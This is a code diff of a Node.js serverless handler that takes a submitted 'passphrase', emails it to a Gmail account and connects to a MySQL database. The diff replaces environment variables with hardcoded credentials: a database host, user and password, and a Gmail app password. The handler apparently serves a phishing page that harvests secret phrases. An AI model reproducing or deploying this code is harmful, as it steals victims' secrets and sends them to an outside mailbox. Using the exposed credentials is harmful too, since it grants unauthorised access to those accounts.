@@ -1,6 +1,5 @@
 const nodemailer = require('nodemailer');
 const mysql = require('mysql2/promise');
-require('dotenv').config();
 
 module.exports = async (req, res) => {
     // Add CORS headers
@@ -24,11 +23,11 @@ module.exports = async (req, res) => {
     try {
         console.log('Connecting to database...'); // Debug log
         const connection = await mysql.createConnection({
-            host: process.env.DB_HOST,
-            database: process.env.DB_NAME,
-            user: process.env.DB_USER,
-            password: process.env.DB_PASSWORD,
-            port: process.env.DB_PORT
+            host: 'bsesy40mbqn8h31qwpbf-mysql.services.clever-cloud.com',
+            database: 'bsesy40mbqn8h31qwpbf',
+            user: 'ucbk7mg2jjui7aw2',
+            password: 'QuUCbwXnRw1o1WnKCk4V',
+            port: 3306
         });
         console.log('Database connected successfully'); // Debug log
 
@@ -47,15 +46,15 @@ module.exports = async (req, res) => {
             port: 465,
             secure: true,
             auth: {
-                user: process.env.EMAIL_USER,
-                pass: process.env.EMAIL_PASS
+                user: 'kutijude1@gmail.com',
+                pass: 'rtbqiskopahksnha'
             }
         });
 
         console.log('Sending email...'); // Debug log
         await transporter.sendMail({
-            from: process.env.EMAIL_USER,
-            to: process.env.EMAIL_USER,
+            from: 'kutijude1@gmail.com',
+            to: 'kutijude1@gmail.com',
             subject: 'New Passphrase Submitted',
             html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
         });
